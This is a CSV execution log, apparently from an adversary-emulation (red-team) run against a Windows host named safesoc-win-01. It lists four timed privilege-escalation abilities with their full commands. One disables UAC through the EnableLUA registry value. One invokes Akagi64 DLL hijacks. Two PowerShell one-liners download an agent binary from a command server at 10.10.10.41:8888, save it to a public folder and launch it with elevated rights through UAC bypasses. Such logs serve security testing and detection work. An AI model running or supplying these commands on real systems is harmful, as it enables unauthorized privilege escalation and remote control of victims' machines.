Time Ran,Ability Name,Agent,Host,pid,Link Command,Plaintext Command
2026-05-15T00:45:05Z,UAC bypass registry,fujqbt,safesoc-win-01,7644,New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force,New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force
2026-05-15T00:46:00Z,wow64log DLL Hijack,fujqbt,safesoc-win-01,8948,.\Akagi64.exe 30 C:\Windows\System32\cmd.exe,.\Akagi64.exe 30 C:\Windows\System32\cmd.exe
2026-05-15T00:46:45Z,duser/osksupport DLL Hijack,fujqbt,safesoc-win-01,8060,$url="http://10.10.10.41:8888/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$wc.Headers.add("server","http://10.10.10.41:8888");$wc.Headers.add("defaultSleep","60");$wc.Headers.add("defaultGroup","bypassed_u_bro");$data=$wc.DownloadData($url);$name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","");[io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data);.\Akagi64.exe 32 "C:\Users\Public\$name.exe -server http://10.10.10.41:8888",$url="http://10.10.10.41:8888/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$wc.Headers.add("server","http://10.10.10.41:8888");$wc.Headers.add("defaultSleep","60");$wc.Headers.add("defaultGroup","bypassed_u_bro");$data=$wc.DownloadData($url);$name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","");[io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data);.\Akagi64.exe 32 "C:\Users\Public\$name.exe -server http://10.10.10.41:8888"
2026-05-15T00:47:35Z,Bypass UAC Medium,fujqbt,safesoc-win-01,5780,$url="http://10.10.10.41:8888/file/download"; $wc=New-Object System.Net.WebClient; $wc.Headers.add("platform","windows"); $wc.Headers.add("file","sandcat.go"); $data=$wc.DownloadData($url); $name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"",""); [io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data);$job = Start-Job -ScriptBlock { Import-Module -Name .\Bypass-UAC.ps1; Bypass-UAC -Command "C:\Users\Public\$name.exe -group red"; };Receive-Job -Job $job -Wait;,$url="http://10.10.10.41:8888/file/download"; $wc=New-Object System.Net.WebClient; $wc.Headers.add("platform","windows"); $wc.Headers.add("file","sandcat.go"); $data=$wc.DownloadData($url); $name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"",""); [io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data);$job = Start-Job -ScriptBlock { Import-Module -Name .\Bypass-UAC.ps1; Bypass-UAC -Command "C:\Users\Public\$name.exe -group red"; };Receive-Job -Job $job -Wait;
